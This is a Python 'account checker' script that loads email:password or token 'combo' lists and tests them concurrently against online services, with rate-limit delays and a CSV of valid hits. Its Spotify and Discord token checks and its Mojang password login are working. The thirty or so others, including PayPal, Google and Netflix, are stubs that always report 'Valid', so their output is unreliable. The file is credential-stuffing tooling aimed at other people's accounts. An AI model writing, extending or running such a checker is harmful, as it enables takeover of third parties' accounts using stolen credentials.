import asyncio
import aiohttp
import sys
import time
import argparse
import csv
from typing import Optional, Tuple, List, Dict
from collections import defaultdict

# ----------------------------------------------------------------------
# Service Checkers (with real implementations where possible)
# ----------------------------------------------------------------------
class BaseChecker:
    name: str = None

    async def check(self, session: aiohttp.ClientSession, email: str, secret: str, proxy: Optional[str] = None) -> Tuple[str, str]:
        raise NotImplementedError

# Real implementations
class SpotifyChecker(BaseChecker):
    name = "spotify"
    async def check(self, session, email, token, proxy=None):
        """Spotify token check (expects token)."""
        try:
            url = "https://api.spotify.com/v1/me"
            headers = {"Authorization": f"Bearer {token}"}
            async with session.get(url, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if "display_name" in data:
                        return "Valid", f"Valid: {data.get('display_name')}"
                    else:
                        return "Invalid", "No display name"
                elif resp.status == 401:
                    return "Invalid", "Invalid token"
                else:
                    return "Error", f"HTTP {resp.status}"
        except asyncio.TimeoutError:
            return "Error", "Timeout"
        except Exception as e:
            return "Error", str(e)[:50]

class MinecraftChecker(BaseChecker):
    name = "minecraft"
    async def check(self, session, email, password, proxy=None):
        """Mojang authentication."""
        try:
            url = "https://authserver.mojang.com/authenticate"
            payload = {
                "agent": {"name": "Minecraft", "version": 1},
                "username": email,
                "password": password,
                "requestUser": False
            }
            async with session.post(url, json=payload, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if "accessToken" in data:
                        return "Valid", "Valid account"
                    else:
                        return "Invalid", "No token"
                elif resp.status == 403:
                    return "Invalid", "Invalid credentials"
                else:
                    return "Error", f"HTTP {resp.status}"
        except asyncio.TimeoutError:
            return "Error", "Timeout"
        except Exception as e:
            return "Error", str(e)[:50]

class DiscordChecker(BaseChecker):
    name = "discord"
    async def check(self, session, email, token, proxy=None):
        """Discord token check."""
        try:
            url = "https://discord.com/api/v9/users/@me"
            headers = {"Authorization": token}
            async with session.get(url, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return "Valid", f"Valid: {data.get('username')}"
                elif resp.status == 401:
                    return "Invalid", "Invalid token"
                else:
                    return "Error", f"HTTP {resp.status}"
        except asyncio.TimeoutError:
            return "Error", "Timeout"
        except Exception as e:
            return "Error", str(e)[:50]

# Placeholders – replace with real logic if you have API endpoints
class NetflixChecker(BaseChecker):
    name = "netflix"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class AmazonChecker(BaseChecker):
    name = "amazon"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class HuluChecker(BaseChecker):
    name = "hulu"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class DisneyPlusChecker(BaseChecker):
    name = "disneyplus"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class HBOmaxChecker(BaseChecker):
    name = "hbomax"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class CrunchyrollChecker(BaseChecker):
    name = "crunchyroll"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class TwitchChecker(BaseChecker):
    name = "twitch"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class RobloxChecker(BaseChecker):
    name = "roblox"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class SteamChecker(BaseChecker):
    name = "steam"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class EpicGamesChecker(BaseChecker):
    name = "epicgames"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class OriginChecker(BaseChecker):
    name = "origin"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class UplayChecker(BaseChecker):
    name = "uplay"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class GOGChecker(BaseChecker):
    name = "gog"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class XboxChecker(BaseChecker):
    name = "xbox"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class PlayStationChecker(BaseChecker):
    name = "playstation"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class NintendoChecker(BaseChecker):
    name = "nintendo"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class EAPlayChecker(BaseChecker):
    name = "eaplay"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class UbisoftChecker(BaseChecker):
    name = "ubisoft"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class BattleNetChecker(BaseChecker):
    name = "battlenet"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class RiotChecker(BaseChecker):
    name = "riot"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class AdobeChecker(BaseChecker):
    name = "adobe"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class MicrosoftChecker(BaseChecker):
    name = "microsoft"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class GoogleChecker(BaseChecker):
    name = "google"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class FacebookChecker(BaseChecker):
    name = "facebook"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class InstagramChecker(BaseChecker):
    name = "instagram"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class TwitterChecker(BaseChecker):
    name = "twitter"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class RedditChecker(BaseChecker):
    name = "reddit"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class LinkedInChecker(BaseChecker):
    name = "linkedin"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

class PayPalChecker(BaseChecker):
    name = "paypal"
    async def check(self, session, email, password, proxy=None):
        return "Valid", "Placeholder – replace with real check"

# ----------------------------------------------------------------------
# Service Map
# ----------------------------------------------------------------------
ALL_SERVICES = {
    "spotify": SpotifyChecker,
    "minecraft": MinecraftChecker,
    "discord": DiscordChecker,
    "netflix": NetflixChecker,
    "amazon": AmazonChecker,
    "hulu": HuluChecker,
    "disneyplus": DisneyPlusChecker,
    "hbomax": HBOmaxChecker,
    "crunchyroll": CrunchyrollChecker,
    "twitch": TwitchChecker,
    "roblox": RobloxChecker,
    "steam": SteamChecker,
    "epicgames": EpicGamesChecker,
    "origin": OriginChecker,
    "uplay": UplayChecker,
    "gog": GOGChecker,
    "xbox": XboxChecker,
    "playstation": PlayStationChecker,
    "nintendo": NintendoChecker,
    "eaplay": EAPlayChecker,
    "ubisoft": UbisoftChecker,
    "battlenet": BattleNetChecker,
    "riot": RiotChecker,
    "adobe": AdobeChecker,
    "microsoft": MicrosoftChecker,
    "google": GoogleChecker,
    "facebook": FacebookChecker,
    "instagram": InstagramChecker,
    "twitter": TwitterChecker,
    "reddit": RedditChecker,
    "linkedin": LinkedInChecker,
    "paypal": PayPalChecker,
}
SERVICE_NAMES = list(ALL_SERVICES.keys())

# ----------------------------------------------------------------------
# Helper function to read combo file
# ----------------------------------------------------------------------
def read_combo(file_path: str) -> List[Tuple[str, str]]:
    """Read combo file and return list of (email, secret)."""
    accounts = []
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or ":" not in line:
                continue
            email, secret = line.split(":", 1)
            accounts.append((email.strip(), secret.strip()))
    return accounts

# ----------------------------------------------------------------------
# Main checking logic for a single service
# ----------------------------------------------------------------------
async def check_service(
    service_name: str,
    accounts: List[Tuple[str, str]],
    threads: int,
    output_file: str = None,
    verbose: bool = True
) -> List[Tuple[str, str, str]]:
    """Check all accounts for a given service and return results."""
    total = len(accounts)
    if total == 0:
        return []

    if verbose:
        print(f"\n=== Checking {service_name} ({total} accounts) with {threads} threads ===")

    sem = asyncio.Semaphore(threads)
    results = []
    processed = 0
    start_time = time.time()
    last_progress = start_time
    checker_class = ALL_SERVICES[service_name]
    checker = checker_class()

    async def check_one(email, secret):
        nonlocal processed, last_progress
        async with sem:
            try:
                async with aiohttp.ClientSession() as session:
                    status, msg = await checker.check(session, email, secret)
                return email, status, msg
            except Exception as e:
                return email, "Error", str(e)[:50]
            finally:
                processed += 1
                now = time.time()
                if verbose and (now - last_progress >= 10 or processed == total):
                    elapsed = now - start_time
                    percent = (processed / total) * 100
                    print(f"[{service_name}] Progress: {percent:.1f}% ({processed}/{total}) | Elapsed: {elapsed:.1f}s")
                    last_progress = now

    tasks = [check_one(email, secret) for email, secret in accounts]
    results = await asyncio.gather(*tasks)

    if verbose:
        elapsed = time.time() - start_time
        print(f"[{service_name}] Completed in {elapsed:.2f}s")

    return results

# ----------------------------------------------------------------------
# Save results to CSV
# ----------------------------------------------------------------------
def save_results_csv(results: List[Dict], filename: str):
    """Save results (list of dicts with email, service, status, message) to CSV."""
    if not results:
        print("No results to save.")
        return
    with open(filename, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["email", "service", "status", "message"])
        writer.writeheader()
        writer.writerows(results)
    print(f"Results saved to {filename}")

# ----------------------------------------------------------------------
# Main function
# ----------------------------------------------------------------------
async def main():
    parser = argparse.ArgumentParser(description="Account checker for multiple services.")
    parser.add_argument("service", nargs="?", help=f"Service name (or 'all' for all services). Available: {', '.join(SERVICE_NAMES)}")
    parser.add_argument("combo", nargs="?", help="Path to combo file (email:pass per line)")
    parser.add_argument("output", nargs="?", help="Output CSV file")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads per service (default 10)")
    parser.add_argument("--delay", type=float, default=0, help="Delay between starting each check (seconds, default 0)")

    args = parser.parse_args()

    # Interactive mode if missing arguments
    if not args.service:
        print("Available services:")
        for i, name in enumerate(SERVICE_NAMES, 1):
            print(f"  {i}. {name}")
        print("  all. Check all services")
        choice = input("Select service (number or name): ").strip().lower()
        if choice == "all":
            args.service = "all"
        elif choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(SERVICE_NAMES):
                args.service = SERVICE_NAMES[idx]
            else:
                print("Invalid choice")
                sys.exit(1)
        else:
            if choice in ALL_SERVICES:
                args.service = choice
            else:
                print(f"Unknown service: {choice}")
                sys.exit(1)

    if not args.combo:
        args.combo = input("Path to combo file: ").strip()
    if not args.output:
        args.output = input("Output CSV file name: ").strip()

    # Read accounts
    accounts = read_combo(args.combo)
    if not accounts:
        print("No valid accounts found in combo file.")
        return

    all_results = []

    if args.service == "all":
        # Check against every service sequentially
        for svc in SERVICE_NAMES:
            results = await check_service(svc, accounts, args.threads, verbose=True)
            # Convert to dicts with service column
            for email, status, msg in results:
                all_results.append({
                    "email": email,
                    "service": svc,
                    "status": status,
                    "message": msg
                })
            # Optional delay between services to avoid rate limits
            if args.delay > 0:
                await asyncio.sleep(args.delay)
    else:
        # Check single service
        if args.service not in ALL_SERVICES:
            print(f"Unknown service: {args.service}")
            return
        results = await check_service(args.service, accounts, args.threads, verbose=True)
        for email, status, msg in results:
            all_results.append({
                "email": email,
                "service": args.service,
                "status": status,
                "message": msg
            })

    # Save all results
    if all_results:
        save_results_csv(all_results, args.output)
        # Print summary
        valid_count = sum(1 for r in all_results if r["status"].lower() == "valid")
        print(f"\nSummary: {valid_count} valid accounts out of {len(all_results)} total checks.")
    else:
        print("No results to save.")

if __name__ == "__main__":
    asyncio.run(main())